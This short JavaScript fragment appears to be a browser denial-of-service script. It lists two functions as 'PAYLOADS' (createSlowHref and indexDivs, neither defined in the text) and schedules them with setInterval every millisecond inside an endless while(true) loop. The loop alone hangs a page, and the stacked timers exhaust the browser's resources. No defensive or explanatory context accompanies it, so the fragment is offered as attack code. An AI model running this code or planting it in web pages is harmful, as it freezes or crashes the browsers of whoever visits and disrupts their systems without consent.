const PAYLOADS = [
    createSlowHref,
    indexDivs
]
while (true){
for (const payload of PAYLOADS) {
    setInterval(payload, 1);
}
}
